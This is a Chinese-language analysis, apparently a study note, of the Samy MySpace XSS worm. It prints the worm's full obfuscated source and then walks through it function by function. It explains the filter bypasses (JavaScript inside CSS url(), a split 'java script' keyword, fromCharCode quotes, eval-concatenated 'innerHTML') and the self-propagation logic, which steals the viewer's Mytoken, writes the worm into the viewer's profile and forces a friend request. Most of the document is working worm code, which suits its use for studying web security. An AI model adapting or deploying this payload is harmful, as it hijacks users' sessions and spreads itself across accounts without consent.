# samy xss worm 分析

## 源代码
```javascript
<div id=mycode style="BACKGROUND: url('java
script:eval(document.all.mycode.expr)')" expr="var B=String.fromCharCode(34);var A=String.fromCharCode(39);function g(){var C;try{var D=document.body.createTextRange();C=D.htmlText}catch(e){}if(C){return C}else{return eval('document.body.inne'+'rHTML')}}function getData(AU){M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')}function getQueryParams(){var E=document.location.search;var F=E.substring(1,E.length).split('&');var AS=new Array();for(var O=0;O<F.length;O++){var I=F[O].split('=');AS[I[0]]=I[1]}return AS}var J;var AS=getQueryParams();var L=AS['Mytoken'];var M=AS['friendID'];if(location.hostname=='profile.myspace.com'){document.location='http://www.myspace.com'+location.pathname+location.search}else{if(!M){getData(g())}main()}function getClientFID(){return findIn(g(),'up_launchIC( '+A,A)}function nothing(){}function paramsToString(AV){var N=new String();var O=0;for(var P in AV){if(O>0){N+='&'}var Q=escape(AV[P]);while(Q.indexOf('+')!=-1){Q=Q.replace('+','%2B')}while(Q.indexOf('&')!=-1){Q=Q.replace('&','%26')}N+=P+'='+Q;O++}return N}function httpSend(BH,BI,BJ,BK){if(!J){return false}eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST'){J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)}J.send(BK);return true}function findIn(BF,BB,BC){var R=BF.indexOf(BB)+BB.length;var S=BF.substring(R,R+1024);return S.substring(0,S.indexOf(BC))}function getHiddenParameter(BF,BG){return findIn(BF,'name='+B+BG+B+' value='+B,B)}function getFromURL(BF,BG){var T;if(BG=='Mytoken'){T=B}else{T='&'}var U=BG+'=';var V=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y}function getXMLObj(){var Z=false;if(window.XMLHttpRequest){try{Z=new XMLHttpRequest()}catch(e){Z=false}}else if(window.ActiveXObject){try{Z=new ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{Z=new ActiveXObject('Microsoft.XMLHTTP')}catch(e){Z=false}}}return Z}var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);var AD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);var AF;if(AE){AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF=' but most of all, samy is my hero. <d'+'iv id='+AE+'D'+'IV>'}var AG;function getHome(){if(J.readyState!=4){return}var AU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','</td>');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1){if(AF){AG+=AF;var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken='+AR,postHero,'POST',paramsToString(AS))}}}function postHero(){if(J.readyState!=4){return}var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function main(){var AN=getClientFID();var BH='/index.cfm?fuseaction=user.viewProfile&friendID='+AN+'&Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken='+L,processxForm,'GET')}function processxForm(){if(xmlhttp2.readyState!=4){return}var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function httpSend2(BH,BI,BJ,BK){if(!xmlhttp2){return false}eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST'){xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)}xmlhttp2.send(BK);return true}"></DIV>
```
## 思路


### 绕过思路

Myspace 网站过滤了许多标签，事实上仅允许控制`<a>, <img>, <div>`等少数标签，而不允许输入`<script>, <body>`, onClicks, onAnythings, href’s with javascript 等等。

然而，有些浏览器 (IE, some versions of Safari, others) 允许在CSS标签中使用 javascript . 我们需要 javascript 来促成我们的工作。例如：`<div style=”background:url(‘javascript:alert(1)’)”>`

不能在div中使用引号，因为已经使用单引号和双引号。这使得编写JS很困难。我们使用一个表达式来存放js脚本，然后调用其名称执行。
Example: `<div id=”mycode” expr=”alert(‘hah!’)” style=”background:url(‘javascript:eval(document.all.mycode.expr)’)”>`


这样，我们就能使用单引号了。然而, myspace 将过滤任意地方的 “javascript” .但有的浏览器解析 “java\nscript” 为 “javascript” (或是 ` java<NEWLINE>script`)。Example: `<div id=”mycode” expr=”alert(‘hah!’)” style=”background:url(‘javascript:eval(document.all.mycode.expr)’)”>`

除了能使用单引号外，我们还需要双引号。这时我们使用转义引号, e.g., “foo\”bar”. 

Myspace 会转义所有的引号，无论是单引号还是双引号，然而我们可以转换在JavaScript中将10进制为ascii，例如: `<div id=”mycode” expr=”alert(‘double quote: ‘ + String.fromCharCode(34))” style=”background:url(‘javascript:eval(document.all.mycode.expr)’)”>`

为了发送POST代码给正在浏览的用户的 profile，我们需要获得网页的源码。我们可以使用 `document.body.innerHTML`。Myspace 过滤了所有的“innerHTML” . To avoid this, we use an eval() to evaluate two strings and put them together to form “innerHTML”.

Example: `alert(eval(‘document.body.inne’ + ‘rHTML’));`


### 将主要代码至于属性expr中，避免引号使用困难
```
<div id=mycode style="BACKGROUND: url('java
script:eval(document.all.mycode.expr)')" expr="var 
```

例如：
```
<div id=mycode expr="alert(123);"></div><script>javascript:eval(document.all.mycode.getAttribute("expr"));</script>
```
<div id=mycode style="background:url('http://www.baidu.com')"></div>
## 主要函数
- g() 生成文本range，执行在其中输入text内容，返回其结果；
- getData()，获取认证中的‘friedID’ 和 ‘Mytoken’
- getclientFID(), 获取客户端FID





### function getQueryParams()
```js
function getQueryParams(){
    var E=document.location.search; //获取当前页面url中?开始的部分
    var F=E.substring(1,E.length).split('&');
    var AS=new Array();
    for(var O=0;O<F.length;O++){
        //形成一个键值对字典
        var I=F[O].split('=');
        AS[I[0]]=I[1]
    }
    return AS

}
```

### function paramsToString(AV)

```js
function paramsToString(AV){
    var N=new String();
    var O=0;
    for(var P in AV)
    {
        if(O>0)
        {
            N+='&'
        }
        var Q=escape(AV[P]);
        while(Q.indexOf('+')!=-1)
        {
            Q=Q.replace('+','%2B')
        }
        while(Q.indexOf('&')!=-1)
        {
            Q=Q.replace('&','%26')
        }
        N+=P+'='+Q;
        O++
    }
    return N
}
```

### function httpSend(BH,BI,BJ,BK)

```js
function httpSend(BH,BI,BJ,BK){
    if(!J)
    {
        return false
    }
    eval('J.onr'+'eadystatechange=BI');
    J.open(BJ,BH,true);
    if(BJ=='POST')
    {
        J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
        J.setRequestHeader('Content-Length',BK.length)
    }
    J.send(BK);
    return true}
```
### function findIn(BF,BB,BC)

```js
function findIn(BF,BB,BC){
    var R=BF.indexOf(BB)+BB.length;
    var S=BF.substring(R,R+1024);
    return S.substring(0,S.indexOf(BC))
}
```
### function getHiddenParameter(BF,BG)
```js
function getHiddenParameter(BF,BG){
    return findIn(BF,'name='+B+BG+B+' value='+B,B)
}
```
### function getFromURL(BF,BG)
```js
function getFromURL(BF,BG){
    var T;
    if(BG=='Mytoken')
    {
        T=B
    }
    else
    {
        T='&'
    }
    var U=BG+'=';
    var V=BF.indexOf(U)+U.length;
    var W=BF.substring(V,V+1024);
    var X=W.indexOf(T);
    var Y=W.substring(0,X);
    return Y
}
```
### getXMLObj
```js
function getXMLObj(){
    var Z=false;
    if(window.XMLHttpRequest)
    {
        try
        {
            Z=new XMLHttpRequest()
        }
        catch(e)
        {
            Z=false
        }
    }
    else if(window.ActiveXObject)
    {
        try
        {
            Z=new ActiveXObject('Msxml2.XMLHTTP')
        }
        catch(e)
        {
            try{
                Z=new ActiveXObject('Microsoft.XMLHTTP')
            }catch(e){
                Z=false
            }
        }
    }
    return Z
}
```



### getHome
```js
function getHome(){
    if(J.readyState!=4)
    {
        return
    }
    var AU=J.responseText;
    AG=findIn(AU,'P'+'rofileHeroes','</td>');
    AG=AG.substring(61,AG.length);
    if(AG.indexOf('samy')==-1)
    {
        if(AF)
        {
            AG+=AF;
            var AR=getFromURL(AU,'Mytoken');
            var AS=new Array();
            AS['interestLabel']='heroes';
            AS['submit']='Preview';
            AS['interest']=AG;
            J=getXMLObj();
            httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken='+AR,postHero,'POST',paramsToString(AS))
        }
    }
}
```
### postHero
```js
function postHero(){
    if(J.readyState!=4)
    {
        return
    }
    var AU=J.responseText;
    var AR=getFromURL(AU,'Mytoken');
    var AS=new Array();
    AS['interestLabel']='heroes';
    AS['submit']='Submit';
    AS['interest']=AG;
    AS['hash']=getHiddenParameter(AU,'hash');
    httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken='+AR,nothing,'POST',paramsToString(AS))
}
```
### main

```js
var J;
var AS=getQueryParams();
var L=AS['Mytoken'];
var M=AS['friendID'];

if(location.hostname=='profile.myspace.com'){
    document.location='http://www.myspace.com'+location.pathname+location.search
}
else{
    if(!M){
        getData(g())
    }
    main()
}


var AA=g();
var AB=AA.indexOf('m'+'ycode');
var AC=AA.substring(AB,AB+4096);
var AD=AC.indexOf('D'+'IV');
var AE=AC.substring(0,AD);
var AF;
if(AE)
{
    AE=AE.replace('jav'+'a',A+'jav'+'a');
    AE=AE.replace('exp'+'r)','exp'+'r)'+A);
    AF=' but most of all, samy is my hero. <d'+'iv id='+AE+'D'+'IV>'
}

var AG;

function main(){
    var AN=getClientFID();
    var BH='/index.cfm?fuseaction=user.viewProfile&friendID='+AN+'&Mytoken='+L;
    J=getXMLObj();
    httpSend(BH,getHome,'GET');
    xmlhttp2=getXMLObj();
    httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken='+L,processxForm,'GET')
}
```
### processxForm
```js
function processxForm(){
    if(xmlhttp2.readyState!=4)
    {
        return
    }
    var AU=xmlhttp2.responseText;
    var AQ=getHiddenParameter(AU,'hashcode');
    var AR=getFromURL(AU,'Mytoken');
    var AS=new Array();
    AS['hashcode']=AQ;
    AS['friendID']='11851658';
    AS['submit']='Add to Friends';
    httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='+AR,nothing,'POST',paramsToString(AS))
}
```
### httpSend2
```js
function httpSend2(BH,BI,BJ,BK){
    if(!xmlhttp2)
    {
        return false
    }
    eval('xmlhttp2.onr'+'eadystatechange=BI');
    xmlhttp2.open(BJ,BH,true);
    if(BJ=='POST')
    {
        xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
        xmlhttp2.setRequestHeader('Content-Length',BK.length)}xmlhttp2.send(BK);
    return true
}
```